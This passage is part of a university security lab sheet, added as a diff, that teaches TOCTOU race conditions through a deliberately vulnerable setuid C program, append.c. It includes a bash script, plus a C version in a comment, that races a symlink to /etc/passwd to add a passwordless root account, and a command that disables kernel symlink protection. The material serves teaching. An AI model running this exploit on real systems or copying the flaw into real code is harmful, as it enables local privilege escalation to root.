+12.04), the “symlinks in sticky-bit directories” protection was provided
+by a Linux security module called “Yama”, and could be disabled using
+the following command:</p>
+<pre><code>$ sudo sysctl -w kernel.yama.protected_sticky_symlinks=0</code></pre>
+<p>If you aren’t able to easily run the CITS3007 standard development
+environment (e.g. because you are using an M-series MacOS computer), and
+are using an earlier version of Ubuntu instead, then the “yama” version
+of the command might work instead.</p>
+<p>The Linux kernel provides a security framework consisting of various
+“hooks” which can be used by Linux security <em>modules</em>. For
+instance, normally in the Linux kernel, read permissions for a file are
+only checked when a file is opened. However, the security framework
+provides “file hooks” which allow security modules to specify checks
+which should be made whenever a read or write is performed on a file
+descriptor (for example, to revalidate the file permissions in case they
+have changed).</p>
+<p>We will not look in detail at how the security framework and modules
+work, but if you are interested, the architecture of the framework is
+described in a <a href="https://www.usenix.org/legacy/event/sec02/wright.html">2002
+paper</a>, and a guide to some of the modules is provided <a href="https://www.starlab.io/blog/a-brief-tour-of-linux-security-modules">here</a>.</p>
+<!--
+  "Yama" appears to be named after the Hindu deity: <https://lwn.net/Articles/393008/>
+-->
+<p>A list of the currently enabled Linux security modules can be printed
+by running</p>
+<pre><code>$ cat /sys/kernel/security/lsm</code></pre>
+<p>In more recent kernels, the “symlinks in sticky-bit directories”
+protection is built into the kernel.</p>
+</div>
+<h1 data-number="4" id="setuid-append"><span class="header-section-number">4</span> A setuid program</h1>
+<p>Consider the following program, <code>append.c</code>:</p>
+<div class="sourceCode" id="cb20"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
+<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
+<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></span>
+<span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></span>
+<span id="cb20-5"><a href="#cb20-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb20-6"><a href="#cb20-6" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">()</span> <span class="op">{</span></span>
+<span id="cb20-7"><a href="#cb20-7" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> <span class="op">*</span> filename <span class="op">=</span> <span class="st">&quot;/tmp/XYZ&quot;</span><span class="op">;</span></span>
+<span id="cb20-8"><a href="#cb20-8" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> buffer<span class="op">[</span><span class="dv">60</span><span class="op">];</span></span>
+<span id="cb20-9"><a href="#cb20-9" aria-hidden="true" tabindex="-1"></a>  <span class="dt">FILE</span> <span class="op">*</span>fp<span class="op">;</span></span>
+<span id="cb20-10"><a href="#cb20-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb20-11"><a href="#cb20-11" aria-hidden="true" tabindex="-1"></a>  <span class="co">// get user input</span></span>
+<span id="cb20-12"><a href="#cb20-12" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;text to append to &#39;</span><span class="sc">%s</span><span class="st">&#39;: &quot;</span><span class="op">,</span> filename<span class="op">);</span></span>
+<span id="cb20-13"><a href="#cb20-13" aria-hidden="true" tabindex="-1"></a>  fflush<span class="op">(</span>stdout<span class="op">);</span></span>
+<span id="cb20-14"><a href="#cb20-14" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb20-15"><a href="#cb20-15" aria-hidden="true" tabindex="-1"></a>  scanf<span class="op">(</span><span class="st">&quot;</span><span class="sc">%50s</span><span class="st">&quot;</span><span class="op">,</span> buffer <span class="op">);</span></span>
+<span id="cb20-16"><a href="#cb20-16" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb20-17"><a href="#cb20-17" aria-hidden="true" tabindex="-1"></a>  <span class="co">// does `filename` exist, and can the actual user write</span></span>
+<span id="cb20-18"><a href="#cb20-18" aria-hidden="true" tabindex="-1"></a>  <span class="co">// to it?</span></span>
+<span id="cb20-19"><a href="#cb20-19" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(!</span>access<span class="op">(</span>filename<span class="op">,</span> W_OK<span class="op">))</span> <span class="op">{</span></span>
+<span id="cb20-20"><a href="#cb20-20" aria-hidden="true" tabindex="-1"></a>    fp <span class="op">=</span> fopen<span class="op">(</span>filename<span class="op">,</span> <span class="st">&quot;a+&quot;</span><span class="op">);</span></span>
+<span id="cb20-21"><a href="#cb20-21" aria-hidden="true" tabindex="-1"></a>    fwrite<span class="op">(</span><span class="st">&quot;</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> <span class="kw">sizeof</span><span class="op">(</span><span class="dt">char</span><span class="op">),</span> <span class="dv">1</span><span class="op">,</span> fp<span class="op">);</span></span>
+<span id="cb20-22"><a href="#cb20-22" aria-hidden="true" tabindex="-1"></a>    fwrite<span class="op">(</span>buffer<span class="op">,</span> <span class="kw">sizeof</span><span class="op">(</span><span class="dt">char</span><span class="op">),</span> strlen<span class="op">(</span>buffer<span class="op">),</span> fp<span class="op">);</span></span>
+<span id="cb20-23"><a href="#cb20-23" aria-hidden="true" tabindex="-1"></a>    fclose<span class="op">(</span>fp<span class="op">);</span></span>
+<span id="cb20-24"><a href="#cb20-24" aria-hidden="true" tabindex="-1"></a>    exit<span class="op">(</span><span class="dv">0</span><span class="op">);</span></span>
+<span id="cb20-25"><a href="#cb20-25" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
+<span id="cb20-26"><a href="#cb20-26" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb20-27"><a href="#cb20-27" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;No permission</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb20-28"><a href="#cb20-28" aria-hidden="true" tabindex="-1"></a>  exit<span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
+<span id="cb20-29"><a href="#cb20-29" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>It’s intended to be a root-owned setuid program, which takes a string
+of input from a user, and appends it to the end of a temporary file
+<code>/tmp/XYZ</code> (if that file exists) – but only if the user who
+runs the program would normally have permissions to write to the file.
+Because the program runs with root privileges (i.e., has an effective
+user ID of <code>0</code>), it normally could overwrite any file.
+Therefore, the code above uses the <code>access</code> function
+(discussed in lectures) to ensure the <em>actual</em> user running the
+program has the correct permissions.</p>
+<p>Save the program as <code>append.c</code>, and compile it with
+<code>make append.o append</code>. Then make it a root-owned setuid
+program:</p>
+<pre><code>$ sudo chown root:root append
+$ sudo chmod u+s append</code></pre>
+<dl>
+<dt><strong>Question</strong></dt>
+<dd>
+<p>At first glance the program may not seem to have any problem.
+However, there is a race condition vulnerability in the program – can
+you describe what it is? How might an attacker try to exploit this
+program?</p>
+</dd>
+<dt><strong>Question</strong></dt>
+<dd>
+<p>Would the ThreadSanitizer help in detecting this problem? Why or why
+not?</p>
+</dd>
+</dl>
+<h1 data-number="5" id="challenge-exercise-exploiting-append.c"><span class="header-section-number">5</span> Challenge exercise – exploiting
+<code>append.c</code></h1>
+<p>If you have time, you may like to try completing the following
+exercise.</p>
+<p>Suppose we want to exploit the race condition vulnerability in the
+vulnerable <code>append.c</code> program in <a href="#setuid-append">“A
+setuid program”</a>. We could try to use it to target the password file
+<code>/etc/passwd</code>, which is not writable by normal users. We can
+try to “trick” <code>append.c</code> into adding a record to the
+password file, with a goal of creating a new user account that has root
+privileges, and which we can easily access.</p>
+<p>First, let’s refresh our memory as to the format of
+<code>/etc/password</code> – take a look at it by running
+<code>less /etc/passwd</code>.</p>
+<p>Inside the password file, each user has an entry, which consists of
+seven fields separated by colons (:). The entry for the root user is as
+follows:</p>
+<pre><code>  root:x:0:0:root:/root:/bin/bash</code></pre>
+<p>The fields are as follows (<code>man 5 passwd</code> gives the
+details):</p>
+<ul>
+<li>The first field is the user’s login name.</li>
+<li>The second field indicates if the user account has a normal password
+or not – the “<code>x</code>” indicates that root user has a password
+stored in the <code>/etc/shadow</code> file.</li>
+<li>The next two fields are the user’s user ID and group ID – note that
+there is nothing to stop multiple records in <code>/etc/passwd</code>
+having the same user ID and group ID. (If that is the case, multiple
+user <em>names</em> will be able to access the same privileges and
+permissions.)</li>
+<li>The fifth field is the user’s full name and contact details.<a href="#fn3" class="footnote-ref" id="fnref3" role="doc-noteref"><sup>3</sup></a></li>
+<li>The sixth field is the login shell.</li>
+</ul>
+<p>Root’s privileges don’t come from its name (“<code>root</code>”), but
+from its user ID, 0. To create an account with root privileges, we just
+need to append a record to <code>/etc/passwd</code> that has a 0 in the
+third field.</p>
+<p>How will we be able to make use of this new root-privileged user?
+Let’s suppose the new account is called <code>sploit</code>. We will
+want to be able to log into the <code>sploit</code> account. We could
+create a line in <code>/etc/passwd</code> that looks like the
+following:</p>
+<pre><code>  sploit:x:0:0::/root:/bin/bash</code></pre>
+<p>Because the <code>x</code> in the second field means there’s a
+password (actually, a <em>hash</em> of the password) in
+<code>/etc/shadow</code>, we’d need to add a line to
+<code>/etc/shadow</code> as well, containing a hash of our desired
+password. This isn’t too difficult to do, but an easier way would be to
+instead put the hash of our password in <code>/etc/passwd</code>, in
+place of the <code>x</code>. Normally, this is considered bad practice
+and insecure on Unix systems, because <code>/etc/passwd</code> is
+world-readable;<a href="#fn4" class="footnote-ref" id="fnref4" role="doc-noteref"><sup>4</sup></a> but as an attacker, we probably
+don’t care much about preserving the security of the system we’re
+attacking.</p>
+<p>On Ubuntu systems, there is an easier method yet. A particular
+“magic” password value is used for <a href="https://help.ubuntu.com/community/PasswordlessGuestAccount">passwordless
+guest accounts</a>, and the magic value is <code>U6aMy0wojraho</code>
+(the 6th character is zero, not letter O). If we put this value in the
+password field of a user entry, we can just hit the return key when
+prompted for a password, and we can log into the user’s account.</p>
+<p>So our attack should write an entry like the <code>sploit</code> user
+entry above, but instead of “<code>x</code>”, we can use the magic value
+given above, and we will be able to log in to the <code>sploit</code>
+account without a password – for instance, by running
+<code>su sploit</code>.</p>
+<!--
+
+```
+  sploit:U6aMy0wojraho:0:0::/root:/bin/bash
+```
+
+-->
+<h2 data-number="5.1" id="launching-the-race-condition-attack"><span class="header-section-number">5.1</span> Launching the race condition
+attack</h2>
+<p>In order to successfully exploit the <code>append</code> program, we
+need to make <code>/tmp/XYZ</code> point to the password file. In order
+for this critical step to succeed, it has to occur within the window
+between check and use (i.e., between the <code>access()</code> and the
+<code>fopen()</code> calls in the vulnerable program). Let us assume we
+cannot modify the vulnerable program. (If we are an attacker, and we can
+already modify setuid programs, then we can trivially write one that
+grants root access to anybody who runs it – like <code>su</code> but
+without requiring a password.) Therefore, the simplest way to exploit
+<code>append.c</code> is to run our attacking program in parallel to
+“race” against the target program, hoping to win the race condition,
+i.e., changing the link within that critical window. We can’t achieve
+the perfect timing needed for this every time we try, but given many
+attempts, we may be able to succeed.</p>
+<p>Consider how we can increase the probability. For example, we can run
+the vulnerable program for many times; we only need to achieve success
+once among all these trials. Since you need to run the attacks and the
+vulnerable program for many times, you need to write a program to
+automate the attack process. To avoid manually typing an input to the
+vulnerable program <code>append</code>, you can use input
+redirection.</p>
+<p>Try saving the following file as <code>launch.sh</code>, and give it
+executable permissions:</p>
+<div class="sourceCode" id="cb24"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/env bash</span></span>
+<span id="cb24-2"><a href="#cb24-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb24-3"><a href="#cb24-3" aria-hidden="true" tabindex="-1"></a><span class="co"># You can adjust LIMIT to change</span></span>
+<span id="cb24-4"><a href="#cb24-4" aria-hidden="true" tabindex="-1"></a><span class="co"># the number of times the loop runs.</span></span>
+<span id="cb24-5"><a href="#cb24-5" aria-hidden="true" tabindex="-1"></a><span class="va">LIMIT</span><span class="op">=</span>1</span>
+<span id="cb24-6"><a href="#cb24-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb24-7"><a href="#cb24-7" aria-hidden="true" tabindex="-1"></a><span class="co"># uncommenting the following line will print</span></span>
+<span id="cb24-8"><a href="#cb24-8" aria-hidden="true" tabindex="-1"></a><span class="co"># each command as it executes:</span></span>
+<span id="cb24-9"><a href="#cb24-9" aria-hidden="true" tabindex="-1"></a><span class="co">#set -x</span></span>
+<span id="cb24-10"><a href="#cb24-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb24-11"><a href="#cb24-11" aria-hidden="true" tabindex="-1"></a><span class="va">orig_file</span><span class="op">=</span>/tmp/XYZ</span>
+<span id="cb24-12"><a href="#cb24-12" aria-hidden="true" tabindex="-1"></a><span class="va">target_file</span><span class="op">=</span>/etc/passwd</span>
+<span id="cb24-13"><a href="#cb24-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb24-14"><a href="#cb24-14" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> <span class="kw">((</span><span class="va">i</span><span class="op">=</span><span class="dv">0</span><span class="kw">;</span> <span class="va">i</span> <span class="op">&lt;</span> <span class="va">LIMIT</span><span class="kw">;</span> <span class="va">i</span><span class="op">=</span><span class="va">i</span><span class="op">+</span><span class="dv">1</span><span class="kw">));</span> <span class="cf">do</span></span>
+<span id="cb24-15"><a href="#cb24-15" aria-hidden="true" tabindex="-1"></a>  <span class="fu">rm</span> <span class="at">-rf</span> <span class="va">$orig_file</span></span>
+<span id="cb24-16"><a href="#cb24-16" aria-hidden="true" tabindex="-1"></a>  <span class="fu">touch</span> <span class="va">$orig_file</span></span>
+<span id="cb24-17"><a href="#cb24-17" aria-hidden="true" tabindex="-1"></a>  <span class="co"># replace AAA with the text you want appended to /etc/passwd</span></span>
+<span id="cb24-18"><a href="#cb24-18" aria-hidden="true" tabindex="-1"></a>  <span class="kw">(</span><span class="bu">echo</span> <span class="st">&#39;AAA&#39;</span> <span class="kw">|</span> <span class="fu">nice</span> <span class="at">-n</span> 19 ./append<span class="kw">)</span> <span class="kw">&amp;</span></span>
+<span id="cb24-19"><a href="#cb24-19" aria-hidden="true" tabindex="-1"></a>  <span class="fu">unlink</span> <span class="va">$orig_file</span></span>
+<span id="cb24-20"><a href="#cb24-20" aria-hidden="true" tabindex="-1"></a>  <span class="fu">ln</span> <span class="at">-s</span> <span class="va">$target_file</span> <span class="va">$orig_file</span></span>
+<span id="cb24-21"><a href="#cb24-21" aria-hidden="true" tabindex="-1"></a>  <span class="co"># replace BBB with some string that will be found</span></span>
+<span id="cb24-22"><a href="#cb24-22" aria-hidden="true" tabindex="-1"></a>  <span class="co"># if your attack is successful.</span></span>
+<span id="cb24-23"><a href="#cb24-23" aria-hidden="true" tabindex="-1"></a>  <span class="co"># if you insert a `sleep()` in the append</span></span>
+<span id="cb24-24"><a href="#cb24-24" aria-hidden="true" tabindex="-1"></a>  <span class="co"># program, you&#39;ll also want to add a sleep command</span></span>
+<span id="cb24-25"><a href="#cb24-25" aria-hidden="true" tabindex="-1"></a>  <span class="co"># (see `man 1 sleep`)</span></span>
+<span id="cb24-26"><a href="#cb24-26" aria-hidden="true" tabindex="-1"></a>  <span class="co"># here, so your check waits til append has completed.</span></span>
+<span id="cb24-27"><a href="#cb24-27" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="fu">grep</span> <span class="st">&#39;BBB&#39;</span> <span class="va">$target_file</span> <span class="op">&gt;</span> /dev/null<span class="kw">;</span> <span class="cf">then</span></span>
+<span id="cb24-28"><a href="#cb24-28" aria-hidden="true" tabindex="-1"></a>    <span class="bu">echo</span> <span class="st">&quot;attack succeeded&quot;</span></span>
+<span id="cb24-29"><a href="#cb24-29" aria-hidden="true" tabindex="-1"></a>    <span class="bu">exit</span> 0</span>
+<span id="cb24-30"><a href="#cb24-30" aria-hidden="true" tabindex="-1"></a>  <span class="cf">fi</span></span>
+<span id="cb24-31"><a href="#cb24-31" aria-hidden="true" tabindex="-1"></a><span class="cf">done</span></span>
+<span id="cb24-32"><a href="#cb24-32" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb24-33"><a href="#cb24-33" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&quot;attack failed&quot;</span></span>
+<span id="cb24-34"><a href="#cb24-34" aria-hidden="true" tabindex="-1"></a><span class="bu">exit</span> 1</span></code></pre></div>
+<p>If you give this program a higher <code>LIMIT</code> and run it, you
+likely will still not see success – so we need to make our attack
+<em>faster</em>, and <code>./append</code> slower. What ways are there
+of doing so?</p>
+<p>To show that this sort of attack <em>can</em> work, you might like to
+insert the following line (which calls the <code>sleep()</code>
+function, see <code>man 3 sleep</code>) –</p>
+<pre><code>  sleep(1);</code></pre>
+<p>into <code>append.c</code>, before the call to <code>open()</code>,
+then recompile <code>append</code> and run the <code>bash</code> script
+against it. There is now a whole second’s delay between checking
+permissions with <code>access(filename)</code>, and opening the file
+with <code>fopen(filename, ...)</code> – very easy to exploit.</p>
+<p>But a successful exploit of this vulnerability should be able to
+(when run sufficiently many times) take advantage of the original
+<code>append</code> program, even without the call to
+<code>sleep()</code>. See if you can devise one.</p>
+<p>Hint: a C program will be much faster than the Bash script above, and
+the following C functions can be used to unlink (delete) a file and
+create a symlink:</p>
+<div class="sourceCode" id="cb26"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#define _POSIX_C_SOURCE </span><span class="dv">200112</span><span class="bu">L</span></span>
+<span id="cb26-2"><a href="#cb26-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb26-3"><a href="#cb26-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
+<span id="cb26-4"><a href="#cb26-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
+<span id="cb26-5"><a href="#cb26-5" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></span>
+<span id="cb26-6"><a href="#cb26-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb26-7"><a href="#cb26-7" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> somefunc<span class="op">()</span> <span class="op">{</span></span>
+<span id="cb26-8"><a href="#cb26-8" aria-hidden="true" tabindex="-1"></a>  unlink<span class="op">(</span><span class="st">&quot;file-to-delete.txt&quot;</span><span class="op">);</span></span>
+<span id="cb26-9"><a href="#cb26-9" aria-hidden="true" tabindex="-1"></a>  symlink<span class="op">(</span><span class="st">&quot;src-file&quot;</span><span class="op">,</span> <span class="st">&quot;target-file&quot;</span><span class="op">);</span></span>
+<span id="cb26-10"><a href="#cb26-10" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>You should also know from previous classes how to use the
+<code>system()</code> call to run any other shell commands you want
+to.</p>
+<!--
+
+C:
+rm -rf *.o launch && make CC=gcc CFLAGS="-std=c11 -pedantic -O3 -Wall -Wextra" launch.o launch
+
+man 2 unlink, man 3 symlink
+
+```
+#define _POSIX_C_SOURCE 200112L
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+
+
+int main(int argc, char ** argv) {
+  system("rm -rf /tmp/XYZ; touch /tmp/XYZ");
+  system("(echo AAA | nice -n 19 ./append) &");
+  unlink("/tmp/XYZ");
+  symlink("/etc/passwd", "/tmp/XYZ");
+  system("tail -n 1 /etc/passwd");
+}
+
+```
+
+
+-->
+<h2>Credits</h2>
+<p>The code for sections 4 and 5 of this lab is adapted from the Race
+Condition lab at <a href="https://seedsecuritylabs.org/Labs_16.04/PDF/Race_Condition_new.pdf" class="uri">https://seedsecuritylabs.org/Labs_16.04/PDF/Race_Condition_new.pdf</a>
+and is copyright Wenliang Du, Syracuse University.</p>
+<p><br><br></p>
+<!-- vim: syntax=markdown tw=92
+-->
+<section id="footnotes" class="footnotes footnotes-end-of-document" role="doc-endnotes">
+<hr />
+<ol>
+<li id="fn1"><p>See <a href="https://github.com/google/sanitizers/wiki/ThreadSanitizerFlags">ThreadSanitizerFlags</a>
+for a list of all the options that can be passed to ThreadSanitizer. As
+the page dedcribes, <code>history_size=0</code> tracks the last 32K
+memory accesses, and each increment to <code>history_size</code> doubles
+the number of memory accesses tracked.<a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
+<li id="fn2"><p>A similar sort of protection exists for <em>hard</em>
+links, as well. See <a href="https://sysctl-explorer.net/fs/protected_hardlinks/" class="uri">https://sysctl-explorer.net/fs/protected_hardlinks/</a>.<a href="#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
+<li id="fn3"><p>Called the <a href="https://en.wikipedia.org/wiki/Gecos_field">“GECOS” field</a>, for
+historical reasons – the name <a href="https://www.redhat.com/sysadmin/linux-gecos-demystified">was taken
+from</a> an operating system called the General Electric Comprehensive
+Operating System (GECOS).<a href="#fnref3" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
+<li id="fn4"><p><code>/etc/passwd</code> being world-readable doesn’t
+mean everyone can simply <em>read</em> the passwords – recall that we
+don’t store actual passwords, but only hashes of them.<br />
+    But it <em>does</em> mean that anyone who wanted could take a copy
+of the <code>/etc/passwd</code> file and try to “crack” the passwords
+(try many combinations, in hopes of finding the correct one) at their
+leisure, using a program like <a href="https://www.openwall.com/john/">John the Ripper</a>.<a href="#fnref4" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
+</ol>
+</section>
+</body>
+</html>
